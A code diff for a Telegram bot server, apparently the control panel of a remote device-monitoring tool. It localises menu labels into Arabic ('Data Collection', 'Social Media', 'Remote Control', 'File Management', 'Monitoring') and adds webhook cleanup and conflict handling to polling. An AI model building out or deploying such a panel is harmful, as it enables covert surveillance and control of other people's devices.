-            await edit_message_text(chat_id, message_id, f"⚙️ <b>Settings</b>\n<code>{json.dumps(s, ensure_ascii=False)}</code>", reply_markup=build_server_menu())
+            await edit_message_text(chat_id, message_id, f"⚙️ <b>الإعدادات</b>\n<code>{json.dumps(s, ensure_ascii=False)}</code>", reply_markup=build_server_menu())
             await answer_callback_query(cb_id)
             return
         if data == "srv_cleardata":
             save_json(COMMANDS_FILE, [])
             save_json(EVENTS_FILE, [])
-            await edit_message_text(chat_id, message_id, "✅ Data cleared", reply_markup=build_server_menu())
-            await answer_callback_query(cb_id, "Data cleared")
+            await edit_message_text(chat_id, message_id, "✅ تم مسح البيانات", reply_markup=build_server_menu())
+            await answer_callback_query(cb_id, "تم مسح البيانات")
             return
         if data == "srv_backup":
             append_event("Backup created")
-            await edit_message_text(chat_id, message_id, "✅ Backup created", reply_markup=build_server_menu())
+            await edit_message_text(chat_id, message_id, "✅ تم إنشاء نسخة احتياطية", reply_markup=build_server_menu())
             await answer_callback_query(cb_id)
             return
 
@@ -1416,18 +1416,18 @@ async def handle_callback_query(callback):
             d = get_first_device()
             dev_id = d["id"] if d else "none"
             if not d:
-                await answer_callback_query(cb_id, "No device linked", show_alert=True)
+                await answer_callback_query(cb_id, "لا يوجد جهاز مربوط", show_alert=True)
                 return
             
             menu_map = {
-                "data": ("📊 Data Collection", build_data_submenu),
-                "social": ("🌐 Social Media", build_social_submenu),
-                "control": ("🎮 Remote Control", build_control_submenu),
-                "apps": ("📦 App Management", build_apps_submenu),
-                "files": ("📂 File Management", build_files_submenu),
-                "security": ("🔒 Security", build_security_submenu),
-                "monitor": ("🔍 Monitoring", build_monitor_submenu),
-                "syssettings": ("⚙️ System Settings", build_syssettings_submenu),
+                "data": ("📊 جمع البيانات", build_data_submenu),
+                "social": ("🌐 التواصل الاجتماعي", build_social_submenu),
+                "control": ("🎮 التحكم عن بعد", build_control_submenu),
+                "apps": ("📦 إدارة التطبيقات", build_apps_submenu),
+                "files": ("📂 إدارة الملفات", build_files_submenu),
+                "security": ("🔒 الأمان", build_security_submenu),
+                "monitor": ("🔍 المراقبة", build_monitor_submenu),
+                "syssettings": ("⚙️ إعدادات النظام", build_syssettings_submenu),
             }
             if cat in menu_map:
                 label, builder = menu_map[cat]
@@ -1438,7 +1438,7 @@ async def handle_callback_query(callback):
         await answer_callback_query(cb_id)
     except Exception as exc:
         log.error("Callback error: %s - %s", exc, traceback.format_exc())
-        await answer_callback_query(cb_id, "Error", show_alert=True)
+        await answer_callback_query(cb_id, "خطأ", show_alert=True)
 
 # ============================================================================
 # REST API ENDPOINTS
@@ -2344,10 +2344,32 @@ async def serve_dashboard(request):
 # ============================================================================
 
 async def tg_poll_loop():
-    global tg_offset, polling_active
+    global tg_offset, polling_active, _processed_update_ids, _processed_message_keys
     polling_active = True
+    
+    # === تنظيف الاتصالات القديمة عند بدء التشغيل ===
+    log.info("Cleaning old connections (deleteWebhook)...")
+    try:
+        session = get_tg_session()
+        # حذف webhook وتجاهل التحديثات المعلقة
+        async with session.post(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=true") as resp:
+            r = await resp.json()
+            log.info("deleteWebhook: %s", r.get("description", r.get("ok")))
+        await asyncio.sleep(1)
+        # التحقق من البوت
+        async with session.post(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe") as resp:
+            me = await resp.json()
+            if me.get("ok"):
+                log.info("Bot connected: @%s (%s)", me["result"].get("username", "?"), me["result"].get("first_name", "?"))
+            else:
+                log.warning("getMe failed: %s", me)
+        await asyncio.sleep(1)
+    except Exception as exc:
+        log.warning("Connection cleanup: %s", exc)
+    
     log.info("Starting Telegram getUpdates polling...")
     
+    _conflict_count = 0
     while polling_active:
         try:
             payload = {
@@ -2357,8 +2379,15 @@ async def tg_poll_loop():
             }
             result = await tg_request("getUpdates", payload)
             if not result or not result.get("ok"):
-                await asyncio.sleep(2)
+                desc = (result or {}).get("description", "")
+                if "Conflict" in desc:
+                    _conflict_count += 1
+                    log.warning("Conflict detected (%d), waiting...", _conflict_count)
+                    await asyncio.sleep(8)
+                else:
+                    await asyncio.sleep(2)
                 continue
+            _conflict_count = 0  # إعادة العداد عند النجاح
             
             updates = result.get("result", [])
             for update in updates:
@@ -2461,7 +2490,7 @@ def create_app():
     # Auth API
     app.router.add_post("/api/login", api_web_login)
     
-    # Device API (no auth - device authenticates via link code/token)
+    # Device API - يدعم صيغتين: path param و query/body param (للتوافق مع التطبيق)
     app.router.add_post("/api/verify_link", api_verify_link)
     app.router.add_post("/api/register", api_register)
     app.router.add_get("/api/commands/{device_id}", api_get_commands)
